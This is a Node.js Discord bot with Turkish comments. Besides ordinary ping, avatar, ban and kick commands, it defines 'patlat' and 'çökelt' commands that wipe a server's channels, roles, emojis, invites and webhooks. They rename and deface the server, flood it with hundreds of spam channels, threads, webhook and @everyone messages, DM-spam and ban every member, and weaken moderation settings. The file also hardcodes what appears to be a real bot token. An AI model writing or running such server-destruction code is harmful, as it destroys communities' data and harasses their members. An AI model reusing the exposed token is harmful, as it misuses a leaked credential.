const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
const fs = require('fs');
const path = require('path');

// Bot yapılandırması
const config = {
    token: 'MTM5MjU3NTkxNzEzMzQwMjI5NA.GtO2Bt.Zd4oLHQrsBxzkDqpPSmpKLnLpcZ6Vt_8WLTcCg',
    clientId: '1392575917133402294',
    guildId: 'YOUR_GUILD_ID'
};

// Bot client'ı oluştur
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates
    ]
});

// Komutlar
const commands = [
    new SlashCommandBuilder()
        .setName('ping')
        .setDescription('Botun ping değerini gösterir'),
    
    new SlashCommandBuilder()
        .setName('avatar')
        .setDescription('Kullanıcının avatarını gösterir')
        .addUserOption(option =>
            option.setName('user')
                .setDescription('Avatar\'ını görmek istediğiniz kullanıcı')
                .setRequired(false)),
    
    new SlashCommandBuilder()
        .setName('ban')
        .setDescription('Kullanıcıyı banlar')
        .addUserOption(option =>
            option.setName('user')
                .setDescription('Banlanacak kullanıcı')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('Ban sebebi')
                .setRequired(false)),
    
    new SlashCommandBuilder()
        .setName('kick')
        .setDescription('Kullanıcıyı atar')
        .addUserOption(option =>
            option.setName('user')
                .setDescription('Atılacak kullanıcı')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('Atma sebebi')
                .setRequired(false)),
    
    new SlashCommandBuilder()
        .setName('patlat')
        .setDescription('Sunucudaki tüm kanaları ve rolleri siler')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    
    new SlashCommandBuilder()
        .setName('çökelt')
        .setDescription('Sunucuyu tamamen çökelten komut')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
];

// Komutları kaydet
const rest = new REST({ version: '10' }).setToken(config.token);

(async () => {
    try {
        console.log('Komutlar yükleniyor...');
        await rest.put(
            Routes.applicationGuildCommands(config.clientId, config.guildId),
            { body: commands }
        );
        console.log('Komutlar başarıyla yüklendi!');
    } catch (error) {
        console.error(error);
    }
})();

// Bot hazır olduğunda
client.once('ready', () => {
    console.log(`Bot ${client.user.tag} olarak giriş yaptı!`);
});

// Slash komutlarını işle
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'ping') {
        await interaction.reply(`Pong! Ping: ${client.ws.ping}ms`);
    }

    if (commandName === 'avatar') {
        const user = interaction.options.getUser('user') || interaction.user;
        const avatarEmbed = new EmbedBuilder()
            .setTitle(`${user.username}'in Avatarı`)
            .setImage(user.displayAvatarURL({ dynamic: true, size: 1024 }))
            .setColor('#0099ff');
        
        await interaction.reply({ embeds: [avatarEmbed] });
    }

    if (commandName === 'ban') {
        const user = interaction.options.getUser('user');
        const reason = interaction.options.getString('reason') || 'Sebep belirtilmemiş';
        
        if (!interaction.member.permissions.has(PermissionFlagsBits.BanMembers)) {
            return interaction.reply({ content: 'Bu komutu kullanmak için yetkiniz yok!', ephemeral: true });
        }
        
        try {
            await interaction.guild.members.ban(user, { reason });
            await interaction.reply(`${user.tag} başarıyla banlandı! Sebep: ${reason}`);
        } catch (error) {
            await interaction.reply({ content: 'Kullanıcı banlanırken bir hata oluştu!', ephemeral: true });
        }
    }

    if (commandName === 'kick') {
        const user = interaction.options.getUser('user');
        const reason = interaction.options.getString('reason') || 'Sebep belirtilmemiş';
        
        if (!interaction.member.permissions.has(PermissionFlagsBits.KickMembers)) {
            return interaction.reply({ content: 'Bu komutu kullanmak için yetkiniz yok!', ephemeral: true });
        }
        
        try {
            const member = await interaction.guild.members.fetch(user.id);
            await member.kick(reason);
            await interaction.reply(`${user.tag} başarıyla atıldı! Sebep: ${reason}`);
        } catch (error) {
            await interaction.reply({ content: 'Kullanıcı atılırken bir hata oluştu!', ephemeral: true });
        }
    }

    if (commandName === 'patlat') {
        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
            return interaction.reply({ content: 'Bu komutu kullanmak için yönetici yetkisi gerekli!', ephemeral: true });
        }

        await interaction.reply('Sunucu patlatılıyor...');

        try {
            // Tüm kanalları sil
            const channels = await interaction.guild.channels.fetch();
            for (const channel of channels.values()) {
                if (channel.deletable) {
                    await channel.delete();
                }
            }

            // Tüm rolleri sil (@everyone hariç)
            const roles = await interaction.guild.roles.fetch();
            for (const role of roles.values()) {
                if (role.name !== '@everyone' && role.editable) {
                    await role.delete();
                }
            }

            console.log('Sunucu başarıyla patlatıldı!');
        } catch (error) {
            console.error('Patlatma sırasında hata:', error);
        }
    }

    if (commandName === 'çökelt') {
        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
            return interaction.reply({ content: 'Bu komutu kullanmak için yönetici yetkisi gerekli!', ephemeral: true });
        }

        await interaction.reply('🔥 SUNUCU ÇÖKELTİLİYOR... 🔥');

        try {
            // Sunucu adını değiştir
            try {
                await interaction.guild.setName('ÇÖKELTİLDİ');
            } catch (error) {
                console.error('Sunucu adı değiştirilemedi:', error);
            }

            // Sunucu açıklamasını değiştir
            try {
                await interaction.guild.setDescription('BU SUNUCU ÇÖKELTİLDİ!');
            } catch (error) {
                console.error('Sunucu açıklaması değiştirilemedi:', error);
            }

            // Sunucu ikonunu değiştir (kırmızı X)
            try {
                await interaction.guild.setIcon('https://cdn.discordapp.com/attachments/123456789/987654321/destroyed.png');
            } catch (error) {
                console.error('Sunucu ikonu değiştirilemedi:', error);
            }

            // Tüm emojileri sil
            const emojis = await interaction.guild.emojis.fetch();
            for (const emoji of emojis.values()) {
                try {
                    await emoji.delete();
                } catch (error) {
                    console.error(`Emoji ${emoji.name} silinemedi:`, error);
                }
            }

            // Tüm stickerleri sil
            const stickers = await interaction.guild.stickers.fetch();
            for (const sticker of stickers.values()) {
                try {
                    await sticker.delete();
                } catch (error) {
                    console.error(`Sticker ${sticker.name} silinemedi:`, error);
                }
            }

            // Tüm webhookları sil
            const webhooks = await interaction.guild.fetchWebhooks();
            for (const webhook of webhooks.values()) {
                try {
                    await webhook.delete();
                } catch (error) {
                    console.error(`Webhook ${webhook.name} silinemedi:`, error);
                }
            }

            // Tüm davetleri sil
            const invites = await interaction.guild.invites.fetch();
            for (const invite of invites.values()) {
                try {
                    await invite.delete();
                } catch (error) {
                    console.error(`Davet ${invite.code} silinemedi:`, error);
                }
            }

            // Tüm kanalları sil
            const channels = await interaction.guild.channels.fetch();
            for (const channel of channels.values()) {
                if (channel.deletable) {
                    try {
                        await channel.delete();
                    } catch (error) {
                        console.error(`Kanal ${channel.name} silinemedi:`, error);
                    }
                }
            }

            // Tüm rolleri sil (@everyone hariç)
            const roles = await interaction.guild.roles.fetch();
            for (const role of roles.values()) {
                if (role.name !== '@everyone' && role.editable) {
                    try {
                        await role.delete();
                    } catch (error) {
                        console.error(`Rol ${role.name} silinemedi:`, error);
                    }
                }
            }

            // Üye nicknamelerini değiştir
            const members = await interaction.guild.members.fetch();
            for (const member of members.values()) {
                if (member.id !== client.user.id && member.manageable) {
                    try {
                        await member.setNickname('ÇÖKELTİLDİ');
                    } catch (error) {
                        console.error(`${member.user.tag} nickname değiştirilemedi:`, error);
                    }
                }
            }

            // Spam roller oluştur
            const spamRoleNames = ['ÇÖKELTİLDİ', 'HACKED', 'DESTROYED', 'NUKED', 'REKT', 'OWNED', 'PWNED', 'GET-REKT', 'EZ-CLAP', 'DEMOLISHED'];
            const createdRoles = [];
            for (let i = 0; i < 50; i++) {
                try {
                    const role = await interaction.guild.roles.create({
                        name: `${spamRoleNames[i % spamRoleNames.length]}-${i}`,
                        color: Math.floor(Math.random() * 16777215),
                        mentionable: true,
                        permissions: []
                    });
                    createdRoles.push(role);
                } catch (error) {
                    console.error(`Spam rol oluşturulamadı:`, error);
                }
            }

            // Spam kategoriler oluştur
            const spamCategories = [];
            for (let i = 0; i < 25; i++) {
                try {
                    const category = await interaction.guild.channels.create({
                        name: `ÇÖKELTİLDİ-KATEGORİ-${i}`,
                        type: 4
                    });
                    spamCategories.push(category);
                } catch (error) {
                    console.error('Spam kategori oluşturulamadı:', error);
                }
            }

            // Spam metin kanalları oluştur
            const spamChannelNames = ['çökeltildi', 'hacked', 'destroyed', 'nuked', 'rekt', 'owned', 'pwned', 'get-rekt', 'ez-clap', 'demolished', 'wasted', 'obliterated'];
            const createdChannels = [];
            for (let i = 0; i < 200; i++) {
                try {
                    const channel = await interaction.guild.channels.create({
                        name: `${spamChannelNames[i % spamChannelNames.length]}-${i}`,
                        type: 0,
                        parent: spamCategories[i % spamCategories.length]?.id
                    });
                    createdChannels.push(channel);
                } catch (error) {
                    console.error('Spam kanal oluşturulamadı:', error);
                }
            }

            // Spam ses kanalları oluştur
            for (let i = 0; i < 50; i++) {
                try {
                    await interaction.guild.channels.create({
                        name: `ÇÖKELTİLDİ-SES-${i}`,
                        type: 2,
                        parent: spamCategories[i % spamCategories.length]?.id
                    });
                } catch (error) {
                    console.error('Spam ses kanalı oluşturulamadı:', error);
                }
            }

            // Spam forum kanalları oluştur
            for (let i = 0; i < 25; i++) {
                try {
                    await interaction.guild.channels.create({
                        name: `ÇÖKELTİLDİ-FORUM-${i}`,
                        type: 15,
                        parent: spamCategories[i % spamCategories.length]?.id
                    });
                } catch (error) {
                    console.error('Spam forum kanalı oluşturulamadı:', error);
                }
            }

            // Webhook spam sistemi
            const webhookSpam = async (channel) => {
                try {
                    for (let i = 0; i < 10; i++) {
                        const webhook = await channel.createWebhook({
                            name: `ÇÖKELTİLDİ-WEBHOOK-${i}`,
                            avatar: 'https://cdn.discordapp.com/attachments/123456789/987654321/hacker.png'
                        });

                        // Webhook ile spam mesajlar
                        for (let j = 0; j < 25; j++) {
                            try {
                                await webhook.send({
                                    content: '@everyone SUNUCU ÇÖKELTİLDİ! GET REKT!',
                                    embeds: [{
                                        title: '🔥 SUNUCU ÇÖKELTİLDİ 🔥',
                                        description: 'Bu sunucu tamamen çökeltildi!\nTüm verileriniz silindi!\nGeri dönüş yok!',
                                        color: 0xff0000,
                                        image: {
                                            url: 'https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif'
                                        },
                                        footer: {
                                            text: 'HACKED BY DISCORD BOT'
                                        }
                                    }]
                                });
                            } catch (error) {
                                console.error('Webhook mesajı gönderilemedi:', error);
                            }
                        }
                    }
                } catch (error) {
                    console.error('Webhook oluşturulamadı:', error);
                }
            };

            // Her kanala mesaj spam ve webhook spam
            for (const channel of createdChannels) {
                if (channel && channel.type === 0) {
                    // Normal mesaj spam
                    const spamMessages = [
                        '@everyone 🔥 SUNUCU ÇÖKELTİLDİ! 🔥',
                        '@everyone 💀 HACKED BY DISCORD BOT! 💀',
                        '@everyone ⚡ GET REKT NOOBS! ⚡',
                        '@everyone 🎯 EZ CLAP DESTROYED! 🎯',
                        '@everyone 💥 NUKED AND PWNED! 💥',
                        '@everyone 🏴‍☠️ RIP SERVER 2024! 🏴‍☠️',
                        '@everyone 👑 OWNED BY BOT! 👑',
                        '@everyone ✅ MISSION ACCOMPLISHED! ✅',
                        '@everyone 🚨 SYSTEM COMPROMISED! 🚨',
                        '@everyone 🔒 ALL DATA DELETED! 🔒'
                    ];

                    // Thread spam
                    for (let i = 0; i < 20; i++) {
                        try {
                            const thread = await channel.threads.create({
                                name: `ÇÖKELTİLDİ-THREAD-${i}`,
                                autoArchiveDuration: 60,
                                reason: 'Sunucu çökeltiliyor'
                            });

                            for (let j = 0; j < 10; j++) {
                                await thread.send(spamMessages[j % spamMessages.length]);
                            }
                        } catch (error) {
                            console.error('Thread oluşturulamadı:', error);
                        }
                    }

                    // Normal mesaj spam
                    for (let i = 0; i < 30; i++) {
                        try {
                            const message = await channel.send({
                                content: spamMessages[i % spamMessages.length],
                                embeds: [{
                                    title: '🔥 SUNUCU ÇÖKELTİLDİ 🔥',
                                    description: `Bu sunucu tamamen çökeltildi!\nTüm verileriniz silindi!\nGeri dönüş yok!\n\n**Spam Mesaj #${i + 1}**`,
                                    color: 0xff0000,
                                    thumbnail: {
                                        url: 'https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif'
                                    },
                                    footer: {
                                        text: 'HACKED BY DISCORD BOT',
                                        icon_url: 'https://cdn.discordapp.com/attachments/123456789/987654321/skull.png'
                                    },
                                    timestamp: new Date()
                                }]
                            });

                            // Reaction spam
                            const reactions = ['🔥', '💀', '⚡', '🎯', '💥', '🏴‍☠️', '👑', '✅', '🚨', '🔒'];
                            for (const reaction of reactions) {
                                try {
                                    await message.react(reaction);
                                } catch (error) {
                                    console.error('Reaction eklenemedi:', error);
                                }
                            }
                        } catch (error) {
                            console.error('Spam mesaj gönderilemedi:', error);
                        }
                    }

                    // Webhook spam
                    webhookSpam(channel);
                }
            }

            // Tüm üyeleri banla ve DM spam (bot ve komut kullanan kişi hariç)
            for (const member of members.values()) {
                if (member.id !== client.user.id && member.id !== interaction.user.id) {
                    // DM spam
                    try {
                        for (let i = 0; i < 5; i++) {
                            await member.send({
                                content: '🔥 SUNUCU ÇÖKELTİLDİ! 🔥',
                                embeds: [{
                                    title: '💀 HACKED BY DISCORD BOT 💀',
                                    description: 'Sunucunuz tamamen çökeltildi!\nTüm verileriniz silindi!\nGeri dönüş yok!\n\nBu bir otomatik mesajdır.',
                                    color: 0xff0000,
                                    image: {
                                        url: 'https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif'
                                    }
                                }]
                            });
                        }
                    } catch (error) {
                        console.error(`${member.user.tag} DM gönderilemedi:`, error);
                    }

                    // Ban
                    if (member.bannable) {
                        try {
                            await member.ban({ reason: 'Sunucu çökeltiliyor - Otomatik ban' });
                        } catch (error) {
                            console.error(`${member.user.tag} banlanamadı:`, error);
                        }
                    }
                }
            }

            // Sunucu ayarlarını değiştir
            try {
                await interaction.guild.setVerificationLevel(0);
                await interaction.guild.setDefaultMessageNotifications(1);
                await interaction.guild.setExplicitContentFilter(0);
                await interaction.guild.setSystemChannelFlags(0);
            } catch (error) {
                console.error('Sunucu ayarları değiştirilemedi:', error);
            }

            // Otomatik spam sistemi (30 saniye boyunca)
            const autoSpam = setInterval(async () => {
                try {
                    const channels = await interaction.guild.channels.fetch();
                    const textChannels = channels.filter(ch => ch.type === 0);
                    
                    for (const channel of textChannels.values()) {
                        if (channel && channel.type === 0) {
                            try {
                                await channel.send('@everyone 🔥 OTOMATIK SPAM SISTEMI AKTIF! 🔥');
                            } catch (error) {
                                console.error('Otomatik spam gönderilemedi:', error);
                            }
                        }
                    }
                } catch (error) {
                    console.error('Otomatik spam hatası:', error);
                }
            }, 2000);

            // 30 saniye sonra otomatik spam'i durdur
            setTimeout(() => {
                clearInterval(autoSpam);
            }, 30000);

            console.log('🔥 SUNUCU TAMAMEN ÇÖKELTİLDİ! 🔥');
        } catch (error) {
            console.error('Çökeltme sırasında genel hata:', error);
        }
    }
});

// Bot'u başlat
client.login(config.token);
